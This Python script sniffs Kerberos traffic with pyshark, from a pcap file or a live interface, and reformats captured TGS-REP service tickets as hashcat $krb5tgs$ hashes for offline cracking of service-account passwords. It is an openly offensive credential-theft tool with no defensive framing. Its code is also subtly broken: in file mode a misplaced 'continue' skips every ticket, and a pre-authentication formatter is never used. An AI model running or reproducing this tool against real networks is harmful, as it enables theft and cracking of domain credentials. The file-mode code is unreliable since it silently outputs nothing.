import argparse
import pyshark

def hashcat_format_krb5tgs(etype, realm, spn, ciphertext):
    if etype == '17' or etype == '18':
        checksum_start = len(ciphertext) - 24
        checksum = ciphertext[checksum_start:]
        cipher = ciphertext[:checksum_start]
    elif etype == '23':
        checksum = ciphertext[:32]
        cipher = ciphertext[32:]

    return f'$krb5tgs${etype}$*UNKNOWN_USERNAME${realm}${spn}@{realm}*${checksum}${cipher}'

def hashcat_format_krb5pa(etype, user, realm, ciphertext):
    if etype=='17' or etype=='18':
        return f'$krb5pa${etype}${user}${realm}${ciphertext}'
    elif etype=='23':
        salt = ciphertext[:32]
        cipher = ciphertext[32:]
        return f'$krb5pa${etype}${user}${realm}${salt}${cipher}'

def capture_kerberos_tickets_from_file(filename):
    print(f'Reading kerberos tickets from file {filename}')
    cap = pyshark.FileCapture(filename, display_filter='kerberos')
    for packet in cap:
        if 'Kerberos' in packet:
            if packet.kerberos.msg_type == '13':
                continue
                etype = packet.kerberos.etype
                realm = packet.kerberos.realm
                if len(packet.kerberos.snamestring) >= 2:
                    spn_part_1 = packet.kerberos.snamestring.all_fields[0].get_default_value()
                    spn_part_2 = packet.kerberos.snamestring.all_fields[1].get_default_value()
                    spn = f'{spn_part_1}/{spn_part_2}'
                else:
                    spn = packet.kerberos.snamestring
                ciphertext = packet.kerberos.cipher.replace(':', '').upper()
                print(hashcat_format_krb5tgs(etype, realm, spn, ciphertext))

def capture_kerberos_tickets_live(interface):
    print(f'Starting live capture on {interface}')
    cap = pyshark.LiveCapture(interface=interface, display_filter='kerberos')
    for packet in cap.sniff_continuously():
        if 'Kerberos' in packet:
            if packet.kerberos.msg_type == '13':
                etype = packet.kerberos.etype
                realm = packet.kerberos.realm
                if len(packet.kerberos.snamestring) >= 2:
                    spn_part_1 = packet.kerberos.snamestring.all_fields[0].get_default_value()
                    spn_part_2 = packet.kerberos.snamestring.all_fields[1].get_default_value()
                    spn = f'{spn_part_1}/{spn_part_2}'
                else:
                    spn = packet.kerberos.snamestring
                ciphertext = packet.kerberos.cipher.replace(':', '').upper()
                print(hashcat_format_krb5tgs(etype, realm, spn, ciphertext))

def main():
    parser = argparse.ArgumentParser(description="Capture and process TGS-REP Kerberos tickets.")
    
    subparsers = parser.add_subparsers(dest='command', help='Subcommand to run')

    # 'file' command
    file_parser = subparsers.add_parser('file', help='Capture kerberos tickets from a file')
    file_parser.add_argument('filename', help='The path to the pcap file')

    # 'live' command
    live_parser = subparsers.add_parser('live', help='Capture kerberos tickets live from an interface')
    live_parser.add_argument('interface', help='Network interface for live capture')

    args = parser.parse_args()

    if args.command == 'file':
        capture_kerberos_tickets_from_file(args.filename)
    elif args.command == 'live':
        capture_kerberos_tickets_live(args.interface)
    else:
        parser.print_help()

if __name__ == '__main__':
    main()

